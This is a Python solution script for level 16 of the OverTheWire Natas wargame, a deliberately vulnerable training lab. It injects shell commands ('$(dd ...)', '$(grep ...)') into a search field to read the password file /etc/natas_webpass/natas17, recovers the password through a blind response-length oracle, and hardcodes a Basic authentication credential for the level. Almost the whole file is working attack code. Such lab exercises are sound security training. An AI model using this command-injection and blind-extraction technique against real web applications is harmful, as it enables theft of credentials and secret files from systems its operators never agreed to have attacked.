

from string import ascii_letters, ascii_lowercase, ascii_uppercase, digits
import requests

def searchWord(needle):
    return requests.get('http://natas16.natas.labs.overthewire.org', 
        params={
            'submit' : 'Search',
            'needle' : needle
        },
        headers={
            'Referer' : 'http://natas16.natas.labs.overthewire.org',
            'Authorization' : 'Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==',
            'Host' : 'natas16.natas.labs.overthewire.org'
        },
        proxies={
            'http': '127.0.0.1:8080',
            'https': '127.0.0.1:8080'
        }
    )

print("Gathering lengths")

# Dictionary that maps a searched character (e.g. a) to the length of the HTTP response body
responses_length = {}
for c in ascii_lowercase:
    responses_length[c] = len(searchWord(c).content)
    responses_length[c.upper()] = responses_length[c]   # the search is case-insensitive


l = len(searchWord('0').content)    # We know that no digits is present in the dictionary, thus all the responses have the same length
for c in digits:
    responses_length[c] = l

whole_length = len(searchWord('.*').content)    # will output the whole dictionary
empty_length = len(searchWord('0').content)     # '0' is not present within dictionar.txt (as any other digit)

# reverse dictionary of length_to_charset.
# i.e. maps a specific HTTP response body length, to a set of possible single-character queries, which when submitted, would yield
# that HTTP response body length
length_to_charset = {}    # length to set of chars

print("Checking uniqness of lengths")
for ch, l in responses_length.items():
    length_to_charset.setdefault(l, set()).add(ch)

for l, char_set in length_to_charset.items():
    assert(l != whole_length)
    if len(char_set) == 10:
        s = ''.join(c for c in sorted(char_set))
        assert(s == digits)         # class with 10 digits
    elif len(char_set) == 2:
        char_list = list(char_set)
        assert(char_list[0].upper() == char_list[1].upper())    # class with two same letters, one being the upper case and the other the lower case character
    else:
        assert(False)               # no other case to deal with

print("Uniqness as expected!")

print("Guessing password (Ignoring digits and casing)")
password = '_'*32
candidates = [] # list of charsets, i.e. values of 'length_to_charset' variable
for i in range(0, len(password)):

    # Sample resulting command:
    # grep -i "$(dd if=/etc/natas_webpass/natas17 bs=1 count=1 skip=1)" dictionary.txt
    l = len(searchWord(
        '$(dd if=/etc/natas_webpass/natas17 bs=1 count=1 skip=' + str(i) + ')'
    ).content)
    candidates.append(length_to_charset[l])
    password = password[:i] + sorted(candidates[i])[0] + password[i+1:]
    print(password)

print("Password looks like: " + password)

print("Brute-forcing candidates for each index")
for i in range(0, len(password)):
    prefix = password[:i]
    for candidate in sorted(candidates[i]):

        # Sample resulting command:
        # grep -i "$(grep -e ^abc /etc/natas_webpass/natas17)" dictionary.txt
        l = len(searchWord(
            '$(grep -e ^' + prefix + candidate + ' /etc/natas_webpass/natas17)'
        ).content)

        if l == empty_length:   # prefix is correct
            password = password[:i] + candidate + password[i+1:]
            print(password[:i+1] + "_"*(len(password) - (i+1)) )
            break
        else:                   # prefix is wrong
            assert(l == whole_length)

print("Complete!")
print("")
print("Credentials for natas17 are:")
print("UN: natas17")
print("PW: " + password)
